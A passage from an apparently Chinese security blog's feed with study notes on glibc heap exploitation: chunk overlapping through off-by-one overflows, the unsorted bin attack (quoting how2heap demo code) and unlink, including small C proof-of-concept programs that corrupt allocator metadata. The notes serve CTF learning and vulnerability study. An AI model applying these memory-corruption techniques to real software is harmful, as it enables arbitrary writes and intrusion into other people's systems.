class="code"><pre><code class="hljs arduino"><span class="hljs-comment">/* consolidate backward */</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">prev_inuse</span>(p)) &#123;<br>      prevsize = <span class="hljs-built_in">prev_size</span> (p);<br>      size += prevsize;<br>      p = <span class="hljs-built_in">chunk_at_offset</span>(p, -((<span class="hljs-type">long</span>) prevsize));<br>      <span class="hljs-comment">/* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */</span><br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (<span class="hljs-built_in">chunksize</span>(p) != prevsize))<br>        <span class="hljs-built_in">malloc_printerr</span> (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br>      <span class="hljs-built_in">unlink_chunk</span> (av, p);<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><ul><li>overlapping可以导致我们重复分配的chunk可以被我们进行任意写</li><li>unlink<ul><li>small bin可以使得指向堆的指针ptr指向ptr-0xc(x86位,64位应该为ptr-0x18),再结合一系列的操作就可以进行任意地址写</li><li>而如果是Large bin的话则只能进行一次任意地址写</li></ul></li></ul><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>ptmalloc实现时当前块的下一块必须是inuse,否则free时会异常(double free时的限制)</p><h2 id="相关操作"><a href="#相关操作" class="headerlink" title="相关操作"></a>相关操作</h2><h3 id="overwrite-allocate"><a href="#overwrite-allocate" class="headerlink" title="overwrite allocate"></a>overwrite allocate</h3><p> 所谓overwrite allocate,就是通过chunk extended,将目标chunk合并进前一个chunk,此时如果free掉前一个chunk再分配合适的size,就可以分配到合并的chunk,这样也就可以对目标chunk进行任意读写了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdilb.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">253</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-type">void</span> *A,*B,*C;<br>    <span class="hljs-type">void</span> *Overlapped;<br>    A=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">252</span>);<br>    B=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">252</span>);<br>    C=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<br>    <span class="hljs-built_in">memset</span>(buf,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">252</span>);<br>    buf[<span class="hljs-number">252</span>]=<span class="hljs-string">&#x27;\x89&#x27;</span>;  <span class="hljs-comment">//把C块包含进来</span><br>    <span class="hljs-built_in">memcpy</span>(A,buf,<span class="hljs-number">253</span>);<span class="hljs-comment">//A存在off-by-one漏洞</span><br>    <span class="hljs-built_in">free</span>(B);<br>    Overlapped=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="overwrite-freed"><a href="#overwrite-freed" class="headerlink" title="overwrite freed"></a>overwrite freed</h3><p>而overwrite freed也是类似,不过是先free掉目标堆块的前一个chunk,然后更改前一个chunk的size(inuse为1),通过chunk extended包含两个chunk,此时就可以对目标堆块进行任意地址读写了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdilb.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">253</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-type">void</span> *A,*B,*C;<br>    <span class="hljs-type">void</span> *Overlapped;<br>    A=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">252</span>);<br>    B=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">252</span>);<br>    C=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<br>    <span class="hljs-built_in">free</span>(B);<br>    <span class="hljs-built_in">memset</span>(buf,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">252</span>);<br>    buf[<span class="hljs-number">252</span>]=<span class="hljs-string">&#x27;\x89&#x27;</span>;<br>    <span class="hljs-built_in">memcpy</span>(A,buf,<span class="hljs-number">253</span>);<span class="hljs-comment">//A存在off-by-one漏洞</span><br>    Overlapped=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">380</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="off-by-one-NULL-byte"><a href="#off-by-one-NULL-byte" class="headerlink" title="off-by-one NULL byte"></a>off-by-one NULL byte</h3><ul><li>而如果溢出位只能是\x00时就变得复杂起来,这里用一位师傅的描述<ol><li>假设有三个已经分配的chunk(A,B,C)</li><li>在A块进行溢出,导致B的inuse位被覆盖为0,此时会让系统认为B已经被free掉了,此时如果再分配两个非fastbin得小chunk(B1,C1),就会分配到B所在的chunk,此时只需要释放B1,然后再释放C,就会引发B,C两块的合并,此时只要重新分配B大小的CHUNK,就可以重新得到B2</li></ol></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">void</span> *A,*B,*C;<br>    <span class="hljs-type">void</span> *B1,*B2;<br>    <span class="hljs-type">void</span> *Overlapping;<br>    A=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    B=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x208</span>);<br>    C=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">free</span>(B);<br>    ((<span class="hljs-type">char</span> *)A)[<span class="hljs-number">0x104</span>]=<span class="hljs-string">&#x27;\x00&#x27;</span>;<br>    B1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    B2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">free</span>(B1);<br>    <span class="hljs-built_in">free</span>(C);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);   <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><p> small bin则是需要触发unlink,但是由于unlink的check,我们需要一个指向堆上的指针来进行check的绕过,这时需要在目标chunk的前一个chunk处伪造一个堆结构,然后进行B的覆盖,此时free B就会导致ptr变为向前的三块的位置,然后就可以复写ptr,然后对ptr进行任意写<br> <figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">void</span> *ptr;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> prev_size,size,fd,bk;<br>    <span class="hljs-type">void</span> *p1,*p2;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">253</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    p1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">252</span>);<br>    p2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">252</span>);<br>    ptr=p1;<br>    prev_size=<span class="hljs-number">0</span>;<br>    size=<span class="hljs-number">249</span>;<br>    fd=(<span class="hljs-type">int</span>)(&amp;ptr)<span class="hljs-number">-0xC</span>;<br>    bk=(<span class="hljs-type">int</span>)(&amp;ptr)<span class="hljs-number">-0x8</span>;<br>    <span class="hljs-built_in">memset</span>(buf,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-number">253</span>);<br>    <span class="hljs-built_in">memcpy</span>(buf,&amp;prev_size,<span class="hljs-number">4</span>);<br>    <span class="hljs-built_in">memcpy</span>(buf<span class="hljs-number">+4</span>,&amp;size,<span class="hljs-number">4</span>);<br>    <span class="hljs-built_in">memcpy</span>(buf<span class="hljs-number">+8</span>,&amp;fd,<span class="hljs-number">4</span>);<br>    <span class="hljs-built_in">memcpy</span>(buf<span class="hljs-number">+12</span>,&amp;bk,<span class="hljs-number">4</span>);<br>    size=<span class="hljs-number">248</span>;<br>    <span class="hljs-built_in">memcpy</span>(&amp;buf[<span class="hljs-number">248</span>],&amp;size,<span class="hljs-number">4</span>);<br>    buf[<span class="hljs-number">252</span>]=<span class="hljs-string">&#x27;\x00&#x27;</span>;<br>    <span class="hljs-built_in">memcpy</span>(p1,buf,<span class="hljs-number">253</span>);<br>    <span class="hljs-built_in">free</span>(p2);<br>&#125;<br></code></pre></td></tr></table></figure></p><ul><li>large bin的攻击则是比较远古的方式,师傅说是因为当时没有对large bin 的unlink检测的相关代码所以导致可以攻击</li><li>unsorted bin 利用大概就是更改global_max的大小</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Unsorted Bin Attack</title>
    <link href="/2019/07/21/Unsorted-Bin-Attack/"/>
    <url>/2019/07/21/Unsorted-Bin-Attack/</url>
    
    <content type="html"><![CDATA[<h1 id="Unsorted-Bin-Attack-study"><a href="#Unsorted-Bin-Attack-study" class="headerlink" title="Unsorted Bin Attack study"></a>Unsorted Bin Attack study</h1><blockquote><p>做一下unsorted bin 的攻击总结好了,日常简单堆的题目靠unsorted bin泄露libc地址Hhh</p></blockquote><h1 id="借鉴学习师傅们的文章"><a href="#借鉴学习师傅们的文章" class="headerlink" title="借鉴学习师傅们的文章"></a>借鉴学习师傅们的文章</h1><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/<br><span class="hljs-symbol">https:</span>//www.anquanke.com/post/id/<span class="hljs-number">85127</span><br><span class="hljs-symbol">https:</span>//veritas<span class="hljs-number">501</span>.space/<span class="hljs-number">2017</span>/<span class="hljs-number">07</span>/<span class="hljs-number">25</span>/<span class="hljs-variable">%E5</span><span class="hljs-variable">%9</span>B<span class="hljs-variable">%BE</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%BD</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%8</span>C<span class="hljs-variable">%96</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%95</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%BA</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%86</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%88</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%94</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%E8</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%87</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%8</span>B/<br><span class="hljs-symbol">https:</span>//blog.csdn.net/qq_<span class="hljs-number">29343201</span>/article/details/<span class="hljs-number">74187621</span><br></code></pre></td></tr></table></figure><p>在此日常膜大师傅们</p><h1 id="unsorted-bin相关"><a href="#unsorted-bin相关" class="headerlink" title="unsorted bin相关"></a>unsorted bin相关</h1><h2 id="零碎知识"><a href="#零碎知识" class="headerlink" title="零碎知识:"></a>零碎知识:</h2><p>  我们知道Ptmalloc一共维护了128个bin，并使用一个数组来存储这些bin,而这些数组的第一个就是Unsorted bin</p><ul><li>如果被用户释放的chunk大于max_fast，或者fast bins中的空闲chunk合并后，这些chunk首先会被放到unsorted bin队列中</li><li>在进行malloc操作的时候，如果在fast bins中没有找到合适的chunk，则ptmalloc会先在unsorted bin中查找合适的空闲chunk，然后才查找bins。</li><li>如果unsorted bin不能满足分配要求。malloc便会将unsorted bin中的chunk加入bins中。然后再从bins中继续进行查找和分配过程。</li><li>unsorted bin可以看做是bins的一个缓冲区，增加它只是为了加快分配的速度。</li><li>在size&gt;FASTBIM_CONNSOLIDATION_THRESHOLD,时(需要大chunk时)，ptmalloc会遍历fast bins中的chunk，将相邻的空闲chunk进行合并，并将合并后的chunk加入unsorted bin中，然后再将usorted bin里的chunk加入bins中。<br>Unsorted Bin</li><li>空闲的chunk连入bin时,会将 P 设为 0 , 并检查前后chunk是否空闲,若空闲则合并后加入unsorted bins中</li><li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li><li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li><li>当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话</li></ul><p>对libc知识不太清楚的可以看看我之前的文章 :  <a href="https://nightrainy.github.io/2019/05/06/glic%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">glibc内存学习笔记</a></p><h2 id="这里也做一个补充"><a href="#这里也做一个补充" class="headerlink" title="这里也做一个补充:"></a><em>这里也做一个补充</em>:</h2><ul><li>fastbin 是 LIFO (后入先出)</li><li>unsorted bin是 FIFO (先进先出)</li><li>small bin 是 FIFO</li><li>large bin 是 FIFO</li><li>tcache 是 LIFO</li></ul><p>也就是除了fastbin和tcache,其余的都是先进先出原则</p><h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h2><p>_int_malloc中有这么一段代码:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">unsorted_chunks (av)-&gt;bk <span class="hljs-operator">=</span> bck<span class="hljs-comment">;</span><br>bck-&gt;fd <span class="hljs-operator">=</span> unsorted_chunks (av)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>也就是如果我们能控制此时bk的的值,我们就能把unsorted_chunks (av)写到任意地址</p><h1 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h1><p>这里我采用shellphish的<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c">代码</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;</span><br>   <span class="hljs-string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var=<span class="hljs-number">0</span>;<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;%p: %ld\n\n&quot;</span>, &amp;stack_var, stack_var);<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,p);<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span><br>           <span class="hljs-string">&quot;the first one during the free()\n\n&quot;</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br><br><span class="hljs-built_in">free</span>(p);<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span><br>   <span class="hljs-string">&quot;point to %p\n&quot;</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br><span class="hljs-comment">//------------VULNERABILITY-----------</span><br><br>p[<span class="hljs-number">1</span>]=(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var<span class="hljs-number">-2</span>);<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br><span class="hljs-comment">//------------------------------------</span><br><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;</span><br>   <span class="hljs-string">&quot;rewritten:\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (<span class="hljs-type">void</span>*)stack_var);<br>&#125;<br></code></pre></td></tr></table></figure><p>咕咕咕~</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>unlink_study</title>
    <link href="/2019/07/19/unlink-study/"/>
    <url>/2019/07/19/unlink-study/</url>
    
    <content type="html"><![CDATA[<blockquote><p>gdb写文章系列hhh</p></blockquote><h1 id="借鉴学习的师傅们的文章"><a href="#借鉴学习的师傅们的文章" class="headerlink" title="借鉴学习的师傅们的文章"></a>借鉴学习的师傅们的文章</h1><p>在此感谢师傅们的无私分享</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>bbs.pediy.com/thread-<span class="hljs-number">224836</span>.htm<br>https:<span class="hljs-regexp">//</span>bbs.pediy.com/thread-<span class="hljs-number">247007</span>.htm<br>https:<span class="hljs-regexp">//</span>ctf-wiki.github.io<span class="hljs-regexp">/ctf-wiki/</span>pwn<span class="hljs-regexp">/linux/g</span>libc-heap<span class="hljs-regexp">/unlink-zh/</span><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/Pwnpanda/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">81369367</span><br></code></pre></td></tr></table></figure><hr><h1 id="0x00-unlink"><a href="#0x00-unlink" class="headerlink" title="0x00 unlink"></a>0x00 unlink</h1><p>前面师傅们的文章已经写的很详尽了,我就不多说了,就先来简要介绍一下unlink好了</p><h2 id="1-unlink的正常目的"><a href="#1-unlink的正常目的" class="headerlink" title="1.unlink的正常目的"></a>1.unlink的正常目的</h2><p><strong>unlink的目的就是为了拿出双向链表中的一个chunk</strong></p><h2 id="2-过程"><a href="#2-过程" class="headerlink" title="2.过程"></a>2.过程</h2><p>在老版的unlink中是没有检查的,所作的工作也十分简单,借用下ctf-wiki的解释也就是:</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span><br><span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="hljs-number">0</span>))      \<br>      malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);               \<br><span class="hljs-comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span><br><span class="hljs-function"><span class="hljs-title">if</span> (__builtin_expect (FD-&gt;</span><span class="hljs-function"><span class="hljs-title">bk</span> != P || BK-&gt;</span>fd != P, <span class="hljs-number">0</span>))                      \<br>  malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \<br><br>  <span class="hljs-comment">// largebin 中 next_size 双向链表完整性检查 </span><br>              <span class="hljs-function"><span class="hljs-title">if</span> (__builtin_expect (P-&gt;</span><span class="hljs-function"><span class="hljs-title">fd_nextsize</span>-&gt;</span>bk_nextsize != P, <span class="hljs-number">0</span>)              \<br>                || __<span class="hljs-function"><span class="hljs-title">builtin_expect</span> (P-&gt;</span><span class="hljs-function"><span class="hljs-title">bk_nextsize</span>-&gt;</span>fd_nextsize != P, <span class="hljs-number">0</span>))    \<br>              malloc_printerr (check_action,                                      \<br>                               <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,    \<br>                               P, AV);<br></code></pre></td></tr></table></figure><p>unlink的过程也就是<br>设置 P-&gt;fd-&gt;bk &#x3D; P-&gt;bk,P-&gt;bk-&gt;fd &#x3D; P-&gt;fd的过程,也就是我们正常对双向链表删除其中一个之后把其余两个链接起来的过程</p><p>而现在的unlink自然是加了检查:</p><ul><li>检查chunk大小,即检查chunk_size&#x3D;&#x3D;next_chunk-&gt;pre_size ? true:false;</li><li>检查链表指针指向,即检查P-&gt;fd-&gt;bk&#x3D;&#x3D;P&amp;&amp;P-&gt;BK-&gt;fd&#x3D;&#x3D;P ? true:false;</li></ul><hr><h2 id="使用unlink的时机"><a href="#使用unlink的时机" class="headerlink" title="使用unlink的时机"></a>使用unlink的时机</h2><ul><li><p>malloc</p><ol><li>在恰好大小的large chunk处取chunk时</li><li>在比请求大小大的bin中取chunk时</li></ol></li><li><p>Free</p><ol><li>后向合并,合并物理相邻低物理地址空闲chunk时</li><li>前向合并,合并物理相邻高物理地址空闲chunk时(top chunk除外)</li></ol></li><li><p>malloc_consolidate</p><ol><li>后向合并,合并物理相邻低地址空闲chunk时。</li><li>前向合并，合并物理相邻高地址空闲 chunk时（top chunk除外）</li></ol></li><li><p>realloc</p><pre><code class="hljs">  前向扩展，合并物理相邻高地址空闲 chunk（除了top chunk）。</code></pre></li></ul><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol><li>use after free,并且可以修改smallbin或者unsorted bin的fd和kb指针时</li><li>已知位置存在一个指针指向可以UAF的chunk</li></ol><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>可以使得UAF的chunk指向向前第三个chunk..有点乱,就是p-&gt;p-0x18这样子</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>修改 fd 为 p - 0x18</p></li><li><p>修改 bk 为 p - 0x10</p></li><li><p>触发 unlink</p></li><li><p>p 处的指针会变为 p - 0x18。</p></li></ol><h1 id="0x01-利用方法"><a href="#0x01-利用方法" class="headerlink" title="0x01 利用方法"></a>0x01 利用方法</h1><p>我们也借用Heap Exploitation系列的unlink来进行说明,这里我做了一点修改,我输出了chunk2的地址,并且做了一些输出说明</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>先看代码</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br> <br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">chunk_structure</span> &#123;<br>  <span class="hljs-type">size_t</span> prev_size;<br>  <span class="hljs-type">size_t</span> size;<br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">chunk_structure</span> *fd;<br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">chunk_structure</span> *bk;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">10</span>];               <span class="hljs-comment">// padding</span><br>&#125;;<br> <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span 